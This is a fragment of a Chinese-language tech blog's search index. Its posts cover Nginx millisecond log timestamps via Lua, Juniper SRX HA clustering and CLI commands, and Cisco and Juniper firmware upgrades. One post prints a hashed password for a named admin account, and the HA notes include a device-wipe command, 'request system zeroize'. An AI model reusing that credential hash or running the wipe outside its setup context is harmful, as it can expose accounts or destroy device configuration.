style=\"color:#e6db74\"\u003e\u0026#34;domains.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(domain_file) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e line \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    domain \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e line\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esplit()[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    upload(domain)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["DNS-01","dehydrated","SSL"],"title":"CDN 相关 https 证书的申请"},{"categories":["Nginx","Lua"],"contents":"Nginx 的 access log 可以记录毫秒级的时间戳，但是是以 EPOCH 开始的毫秒数，比如 1503544071.865, 另一个变量 $time_local 记录的是秒级别的时间格式，比如 24/Aug/2017:11:07:51 +0800，在业务量大的时候，我们需要记录毫秒精度的时间格式，比如 24/Aug/2017:11:07:51.865 +0800, 这个可以通过 Lua 实现。\n首先需要在 nginx.conf 中定义一个变量，叫做 time_millis，并初始化为空。类似于使用 auto-ssl 获取证书的时候需要指定一个 fallback 的自签证书。\nmap $host $time_millis { default \u0026#39;\u0026#39;; } 如果不定义这个变量，在 log_format 中引用的时候会报错。\n使用 Lua 获取毫秒数，并追加到 $time_local 的末尾。\nlog_by_lua_block { millis = string.gsub(ngx.var.msec, \u0026#34;(%d+).(%d+)\u0026#34;, \u0026#34;%2\u0026#34;) ngx.var.time_millis = string.gsub(ngx.var.time_local, \u0026#34;(.+) (.+)\u0026#34;, \u0026#34;%1.\u0026#34; .. millis .. \u0026#34; %2\u0026#34;) } 在 log_format 中将 $time_local 改为 $time_millis\nhttp { map $host $time_millis { default \u0026#39;\u0026#39;; } log_by_lua_block { millis = string.gsub(ngx.var.msec, \u0026#34;(%d+).(%d+)\u0026#34;, \u0026#34;%2\u0026#34;) ngx.var.time_millis = string.gsub(ngx.var.time_local, \u0026#34;(.+) (.+)\u0026#34;, \u0026#34;%1.\u0026#34; .. millis .. \u0026#34; %2\u0026#34;) } log_format main \u0026#39;$remote_addr - $remote_user [$time_millis] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; $msec \u0026#34;$http_x_forwarded_for\u0026#34; $host $request_time $upstream_response_time $scheme \u0026#34;$request_body\u0026#34;\u0026#39;; } ","date":"July 24, 2018","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180724-milliseconds-server-time/","summary":"\u003cp\u003eNginx 的 access log 可以记录毫秒级的时间戳，但是是以 \u003ccode\u003eEPOCH\u003c/code\u003e 开始的毫秒数，比如 \u003ccode\u003e1503544071.865\u003c/code\u003e, 另一个变量 \u003ccode\u003e$time_local\u003c/code\u003e 记录的是秒级别的时间格式，比如 \u003ccode\u003e24/Aug/2017:11:07:51 +0800\u003c/code\u003e，在业务量大的时候，我们需要记录毫秒精度的时间格式，比如 \u003ccode\u003e24/Aug/2017:11:07:51.865 +0800\u003c/code\u003e, 这个可以通过 Lua 实现。\u003c/p\u003e\n\u003cp\u003e首先需要在 nginx.conf 中定义一个变量，叫做 \u003ccode\u003etime_millis\u003c/code\u003e，并初始化为空。类似于使用 \u003ccode\u003eauto-ssl\u003c/code\u003e 获取证书的时候需要指定一个 fallback 的自签证书。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e $host $time_millis {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edefault\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如果不定义这个变量，在 \u003ccode\u003elog_format\u003c/code\u003e 中引用的时候会报错。\u003c/p\u003e\n\u003cp\u003e使用 Lua 获取毫秒数，并追加到 \u003ccode\u003e$time_local\u003c/code\u003e 的末尾。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003elog_by_lua_block\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003emillis\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003estring.gsub(ngx.var.msec,\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;(%d+).(%d+)\u0026#34;,\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%2\u0026#34;)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003engx.var.time_millis\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003estring.gsub(ngx.var.time_local,\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;(.+)\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e(.+)\u0026#34;,\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%1.\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e..\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emillis\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e..\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e%2\u0026#34;)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e在 \u003ccode\u003elog_format\u003c/code\u003e 中将 \u003ccode\u003e$time_local\u003c/code\u003e 改为 \u003ccode\u003e$time_millis\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ehttp\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003emap\u003c/span\u003e $host $time_millis {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003edefault\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003elog_by_lua_block\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003emillis\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003estring.gsub(ngx.var.msec,\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;(%d+).(%d+)\u0026#34;,\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%2\u0026#34;)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#e6db74\"\u003engx.var.time_millis\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003estring.gsub(ngx.var.time_local,\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;(.+)\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e(.+)\u0026#34;,\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;%1.\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e..\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emillis\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e..\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e%2\u0026#34;)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003elog_format\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003emain\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e$remote_addr \u003cspan style=\"color:#e6db74\"\u003e-\u003c/span\u003e $remote_user \u003cspan style=\"color:#e6db74\"\u003e[\u003c/span\u003e$time_millis] \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$request\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e$status $body_bytes_sent \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$http_referer\u0026#34; \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;\u003c/span\u003e$http_user_agent\u0026#34; $msec \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$http_x_forwarded_for\u0026#34; $host $request_time $upstream_response_time $scheme \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$request_body\u0026#34;\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["Nginx","Lua"],"title":"Nginx 访问日志中记录毫秒级别的时间精度"},{"categories":["Firewall","Juniper"],"contents":"load merge relative terminal # 全新設備上面沒啟用過HA 必須先定義Cluster ID # ClustartID 必須獨立，不可以與其他SRX重複，因為HA會建立一組Virtual MAC Address ，而這個ID數值會對其產生影響，重複有可能導致MAC address 重複而出現不可預期的錯誤 # request system zeroize # 以下command 必須在 \u0026gt; 模式使用 set chassis cluster cluster-id \u0026lt;ID範圍 0~ 255\u0026gt; node 0 # 這個是在 node 0 的設備下的 set chassis cluster cluster-id \u0026lt;ID範圍 0~ 255\u0026gt; node 1 # 這個是在 node 1 的設備下的 在secondary node 下 這個command request chassis cluster configuration-synchronize # 等待機器重開機後，會出現Hold 或stanby 字樣 ，看到Cluster 是否有起來 show chassis cluster status # 這個是RETH interface 建立好才會出現，必須先做config才會有 show chassis cluster interfaces # 以下command 則是在 Config mode 下使用 ，先把設定檔建起來 --- # 這邊需要 backup-router 是給 HA裡面的Standby Device 的管理介面 (fxp) 一筆routing 可以回應，預設Standby 不會啟用routing engine，所以需要這筆設定 set groups node0 system host-name SRX-node0 set groups node0 system backup-router 10.10.0.254 set groups node0 system backup-router destination 0.0.0.0/0 set groups node0 interfaces fxp0 unit 0 family inet address 10.10.0.2/24 set groups node1 system host-name SRX-node1 set groups node1 system backup-router 10.10.0.254 set groups node1 system backup-router destination 0.0.0.0/0 set groups node1 interfaces fxp0 unit 0 family inet address 10.10.0.3/24 set apply-groups \u0026#34;${node}\u0026#34; set system time-zone Asia/Taipei set chassis cluster control-link-recovery set chassis cluster reth-count 10 set chassis cluster heartbeat-interval 2000 # 另外建議在建置期間先將IPv6 打開，可以使用以下指令，因為日後開啟IPv6功能則必須要將設備重開機 set security forwarding-options family inet6 mode flow-based # 這邊的interface 號碼要看每一台Chassis 的型號不同而會有所不同 # 最簡單的識別方式是看那台設備的Slot 有幾個，像SRX550HM 是 0~ 8都有擴充可以使用，所以預設HA會在 9開始 ，所以會是 ge-9/x/x set chassis cluster redundancy-group 0 node 0 priority 150 set chassis cluster redundancy-group 0 node 1 priority 100 set chassis cluster redundancy-group 0 interface-monitor ge-0/0/3 weight 150 set chassis cluster redundancy-group 0 interface-monitor ge-0/0/5 weight 150 set chassis cluster redundancy-group 0 interface-monitor ge-9/0/3 weight 100 set chassis cluster redundancy-group 0 interface-monitor ge-9/0/5 weight 100 set chassis cluster redundancy-group 1 node 0 priority 150 set chassis cluster redundancy-group 1 node 1 priority 100 set chassis cluster redundancy-group 1 interface-monitor ge-0/0/3 weight 150 set chassis cluster redundancy-group 1 interface-monitor ge-0/0/5 weight 150 set chassis cluster redundancy-group 1 interface-monitor ge-9/0/3 weight 100 set chassis cluster redundancy-group 1 interface-monitor ge-9/0/5 weight 100 # 這裡是作為Redundancy group: 1 的 Data sync 設定 ，請務必設定上去才會啟用ge-0/0/2 的 heartbeat link set interfaces fab0 fabric-options member-interfaces ge-0/0/2 set interfaces fab1 fabric-options member-interfaces ge-9/0/2 # 設定interface 加入reth Group set interfaces ge-0/0/3 gigether-options redundant-parent reth0 set interfaces ge-0/0/4 gigether-options redundant-parent reth0 set interfaces ge-9/0/3 gigether-options redundant-parent reth0 set interfaces ge-9/0/4 gigether-options redundant-parent reth0 set interfaces ge-0/0/5 gigether-options redundant-parent reth1 set interfaces ge-9/0/5 gigether-options redundant-parent reth1 set interfaces reth0 vlan-tagging # 務必要將RETH 加入 data sync Group 裡面，不然不會動 set interfaces reth0 redundant-ether-options redundancy-group 1 # 特別注意，在SRX雖然是LACP Passive mode ，在Switch 請務必使用LACP Activate mode set interfaces reth0 redundant-ether-options lacp passive set interfaces reth0 redundant-ether-options lacp periodic slow set interfaces reth1 redundant-ether-options redundancy-group 1 set interfaces reth1 unit 0 family inet address 202.99.240.100/26 ","date":"July 21, 2018","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180721-ha/","summary":"\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eload merge relative terminal\n\n# 全新設備上面沒啟用過HA  必須先定義Cluster ID\n# ClustartID 必須獨立，不可以與其他SRX重複，因為HA會建立一組Virtual MAC Address ，而這個ID數值會對其產生影響，重複有可能導致MAC address 重複而出現不可預期的錯誤\n#\n\nrequest system zeroize\n\n# 以下command 必須在  \u0026gt; 模式使用\nset chassis cluster cluster-id \u0026lt;ID範圍 0~ 255\u0026gt; node 0 # 這個是在 node  0 的設備下的\nset chassis cluster cluster-id \u0026lt;ID範圍 0~ 255\u0026gt; node 1 # 這個是在 node 1  的設備下的\n\n在secondary node 下 這個command\nrequest chassis cluster configuration-synchronize\n\n\n# 等待機器重開機後，會出現Hold 或stanby 字樣 ，看到Cluster 是否有起來\n\nshow chassis cluster status\n\n# 這個是RETH interface 建立好才會出現，必須先做config才會有\nshow chassis cluster interfaces\n\n# 以下command 則是在 Config mode 下使用 ，先把設定檔建起來\n\n\n---\n\n# 這邊需要 backup-router 是給 HA裡面的Standby Device 的管理介面 (fxp) 一筆routing 可以回應，預設Standby 不會啟用routing engine，所以需要這筆設定\n\nset groups node0 system host-name SRX-node0\nset groups node0 system backup-router 10.10.0.254\nset groups node0 system backup-router destination 0.0.0.0/0\nset groups node0 interfaces fxp0 unit 0 family inet address 10.10.0.2/24\nset groups node1 system host-name SRX-node1\nset groups node1 system backup-router 10.10.0.254\nset groups node1 system backup-router destination 0.0.0.0/0\nset groups node1 interfaces fxp0 unit 0 family inet address 10.10.0.3/24\n\nset apply-groups \u0026#34;${node}\u0026#34;\nset system time-zone Asia/Taipei\n\nset chassis cluster control-link-recovery\nset chassis cluster reth-count 10\nset chassis cluster heartbeat-interval 2000\n\n# 另外建議在建置期間先將IPv6 打開，可以使用以下指令，因為日後開啟IPv6功能則必須要將設備重開機\nset security forwarding-options family inet6 mode flow-based\n\n\n# 這邊的interface 號碼要看每一台Chassis 的型號不同而會有所不同\n# 最簡單的識別方式是看那台設備的Slot 有幾個，像SRX550HM 是 0~ 8都有擴充可以使用，所以預設HA會在 9開始 ，所以會是 ge-9/x/x\nset chassis cluster redundancy-group 0 node 0 priority 150\nset chassis cluster redundancy-group 0 node 1 priority 100\nset chassis cluster redundancy-group 0 interface-monitor ge-0/0/3 weight 150\nset chassis cluster redundancy-group 0 interface-monitor ge-0/0/5 weight 150\nset chassis cluster redundancy-group 0 interface-monitor ge-9/0/3 weight 100\nset chassis cluster redundancy-group 0 interface-monitor ge-9/0/5 weight 100\n\nset chassis cluster redundancy-group 1 node 0 priority 150\nset chassis cluster redundancy-group 1 node 1 priority 100\nset chassis cluster redundancy-group 1 interface-monitor ge-0/0/3 weight 150\nset chassis cluster redundancy-group 1 interface-monitor ge-0/0/5 weight 150\nset chassis cluster redundancy-group 1 interface-monitor ge-9/0/3 weight 100\nset chassis cluster redundancy-group 1 interface-monitor ge-9/0/5 weight 100\n\n\n# 這裡是作為Redundancy group: 1 的 Data sync 設定 ，請務必設定上去才會啟用ge-0/0/2 的 heartbeat link\nset interfaces fab0 fabric-options member-interfaces ge-0/0/2\nset interfaces fab1 fabric-options member-interfaces ge-9/0/2\n\n# 設定interface 加入reth Group\nset interfaces ge-0/0/3 gigether-options redundant-parent reth0\nset interfaces ge-0/0/4 gigether-options redundant-parent reth0\nset interfaces ge-9/0/3 gigether-options redundant-parent reth0\nset interfaces ge-9/0/4 gigether-options redundant-parent reth0\n\nset interfaces ge-0/0/5 gigether-options redundant-parent reth1\nset interfaces ge-9/0/5 gigether-options redundant-parent reth1\n\nset interfaces reth0 vlan-tagging\n# 務必要將RETH 加入 data sync Group 裡面，不然不會動\nset interfaces reth0 redundant-ether-options redundancy-group 1\n\n# 特別注意，在SRX雖然是LACP Passive mode ，在Switch 請務必使用LACP Activate mode\nset interfaces reth0 redundant-ether-options lacp passive\nset interfaces reth0 redundant-ether-options lacp periodic slow\n\n\nset interfaces reth1 redundant-ether-options redundancy-group 1\nset interfaces reth1 unit 0 family inet address 202.99.240.100/26\n\u003c/code\u003e\u003c/pre\u003e","tags":["Firewall","Juniper"],"title":"HA command"},{"categories":["URL","Nginx"],"contents":" 與 DDoS 奮戰：nginx, iptables 與 fail2ban ","date":"July 20, 2018","hero":"/images/hero/nginx.jpeg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180720-defend-against-ddos-with-nginx-iptable-and-fail2ban/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.techbridge.cc/2016/08/12/defend-against-ddos-with-nginx-iptable-and-fail2ban/\" target=\"_blank\" rel=\"noopener\"\u003e與 DDoS 奮戰：nginx, iptables 與 fail2ban\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Nginx"],"title":"與 DDoS 奮戰：nginx, iptables 與 fail2ban"},{"categories":["Firewall","Juniper"],"contents":"下列操作命令在操作模式下使用，或在配置模式下 run show…\n查看當前防火牆 session 數\nshow security flow session | match 10.22.12.104 show security flow session source-prefix 10.22.12.104 清除當前 session\nclear security flow session all 查 OID\nshow snmp mib walk decimal 1.3.6.1.2.1.2.2.1.2 查看當前軟體版本號\nshow system software 查看系統啟動時間\nshow system uptime 查看硬體板卡及序列號\nshow chassis haredware 查看硬體板卡當前狀態\nshow chassis environment 查看路由表\nshow route 設備商的 Administrative distance / Route preference 預設值比較\n查看 ARP 表\nshow arp 查看系統 log\nshow log messages 查看所有介面運行狀態\nshow interface terse 查看介面運行細節資訊\nshow interface ge-x/y/z detail 動態統計介面資料包轉發資訊\nmonitor interface ge-x/y/z 檢查 ALG 開啟情況\nshow security alg status LOG\nfile list /cf/var/log | match cpu_date_0 BGP Black hole set up\n基本設定 恢復原廠設定\nroot@srx#start shell root@srx% root@srx%cli root@srx# root@srx#load factory-default warning: activing factory configuration *恢復原廠設定後，需立即設置 ROOT 帳密 root@srx# set system root-authentication plain-text-password root@srx#commit 遠端管理帳密配置\nroot@srx#set system login user username class super-user authentication plain-text-password set system login user support029 uid 2029 set system login user support029 class ADMIN set system login user support029 encrypted-password \u0026#34;$5$JQoeH.gs$f6/3srHsGRvvEXZ5Ok/Hpj/uc1CG.sPQZfXMoCXaWk8\u0026#34; # 帳號為 username，擁有 super-user 權限 # 設定連線者 5 分鐘 timeout set system login idle-timeout 5 設定連線者以特定 IP 登入\nset policy-options prefix-list manager-ip 8.8.8.8/32 設置系統時間\nroot@srx#run set date 201711011329.14 root@srx#set system ntp server 168.95.1.1 設定設備名稱\nroot@srx#set system host-name QQ root@QQ# 設定 Domain Name\nroot@srx#set system domain-name abc.cde 設定 DNS\nroot@srx#set system name-server 8.8.8.8 開啟 ssh 遠端管理\nroot@srx#set system service ssh 開啟 https 遠端管理\nroot@srx#set system service web-management https 加註解\nroot@srx#annotate ######加入這兩條 Policy 的 log session ### 可以查看 log debug 問題\nset security policies from-zone DB to-zone INTERNET policy For_Postgres then log session-init set security policies from-zone DB to-zone INTERNET policy For_Postgres then log session-close show log traffic-log ","date":"June 27, 2018","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180627-juniper/","summary":"\u003cp\u003e下列操作命令在操作模式下使用，或在配置模式下 run show…\u003c/p\u003e\n\u003cp\u003e查看當前防火牆 session 數\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eshow security flow session | match 10.22.12.104\nshow security flow session source-prefix 10.22.12.104\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e清除當前 session\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eclear security flow session all\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查 OID\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eshow snmp mib walk decimal 1.3.6.1.2.1.2.2.1.2\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看當前軟體版本號\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eshow system software\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看系統啟動時間\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eshow system uptime\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看硬體板卡及序列號\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eshow chassis haredware\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看硬體板卡當前狀態\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eshow chassis environment\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看路由表\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eshow route\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e設備商的 Administrative distance / Route preference 預設值比較\u003c/p\u003e\n\u003cp\u003e查看 ARP 表\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eshow arp\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看系統 log\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eshow log messages\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看所有介面運行狀態\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eshow interface terse\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e查看介面運行細節資訊\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eshow interface ge-x/y/z detail\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e動態統計介面資料包轉發資訊\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003emonitor interface ge-x/y/z\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e檢查 ALG 開啟情況\u003c/p\u003e","tags":["Firewall","Juniper"],"title":"[Juniper Firewall] command"},{"categories":["Switch","Cisco"],"contents":"事前準備: 插 console\n將更新檔丟到 usb 裡\n使用前可先使用 show version 查看當前版本\n更新 SOP: 將裝有更新檔的 usb 插入要更新版本的 Switch 上，此時畫面會顯示偵測到 device name 將 usb 裡的更新檔複製到 switch 的 flash 裡面: copy usbflash0(device name):更新檔 flash: 此時按 enter 後他會問你檔名是否要用這個，再按一次 enter 即可，看到一堆 ccccccccc 就代表有在複製 複製完後，dir flash 查看底下有沒有剛剛複製過去的更新檔 conf t 進入編輯模式，boot system flash:更新檔 ，指定 Switch 使用新版的 IOS 來開機 exit 離開編輯模式，show boot，確定是否使用新版的 IOS 來開機 write memory，套用設定至 Running-Config reload 大概會跑 15~20 分鐘左右，等他跑完就可以查看版本是否升級成功 copy usbflash0:cat.bin flash: copy usbflash0:cat.bin flash0-2: software install file flash:cat.bin switch 1-2 software clean ","date":"June 14, 2018","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180614-cisco-firmware-version-update/","summary":"\u003ch4 id=\"事前準備\"\u003e事前準備:\u003c/h4\u003e\n\u003cp\u003e插 console\u003c/p\u003e\n\u003cp\u003e將更新檔丟到 usb 裡\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003cem\u003e使用前可先使用 \u003ccode\u003eshow version\u003c/code\u003e 查看當前版本\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003ch4 id=\"更新-sop\"\u003e更新 SOP:\u003c/h4\u003e\n\u003col\u003e\n\u003cli\u003e將裝有更新檔的 usb 插入要更新版本的 Switch 上，此時畫面會顯示偵測到 device name\u003c/li\u003e\n\u003cli\u003e將 usb 裡的更新檔複製到 switch 的 flash 裡面: \u003ccode\u003ecopy usbflash0(device name):更新檔 flash:\u003c/code\u003e\n\u003col\u003e\n\u003cli\u003e此時按 enter 後他會問你檔名是否要用這個，再按一次 enter 即可，看到一堆 ccccccccc 就代表有在複製\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e複製完後，\u003ccode\u003edir flash\u003c/code\u003e 查看底下有沒有剛剛複製過去的更新檔\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003econf t\u003c/code\u003e 進入編輯模式，\u003ccode\u003eboot system flash:更新檔\u003c/code\u003e ，指定 Switch 使用新版的 IOS 來開機\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eexit\u003c/code\u003e 離開編輯模式，\u003ccode\u003eshow boot\u003c/code\u003e，確定是否使用新版的 IOS 來開機\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewrite memory\u003c/code\u003e，套用設定至 Running-Config\u003c/li\u003e\n\u003cli\u003ereload\u003c/li\u003e\n\u003cli\u003e大概會跑 15~20 分鐘左右，等他跑完就可以查看版本是否升級成功\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ecopy usbflash0:cat.bin flash:\ncopy usbflash0:cat.bin flash0-2:\nsoftware install file flash:cat.bin switch 1-2\nsoftware clean\n\u003c/code\u003e\u003c/pre\u003e","tags":["Switch","Cisco"],"title":"Switch版本更新"},{"categories":["Firewall","Juniper"],"contents":"事前準備: 插 console\n將更新檔丟到 usb 裡\n使用前可先使用 show version 查看當前版本\n更新 SOP: start shell su成root身分 建資料夾mkdir /var/tmp/usb(名字可自取) 插入 USB，這邊要注意 da 後面的數字，目前是 da1 掛載 mount -t msdos /dev/da1s1 /var/tmp/usb (如果是 da0，就要變成 da0s1，以此類推) 跑完後 cd /cf/var/tmp/usb/da2s1/ (usb) ls 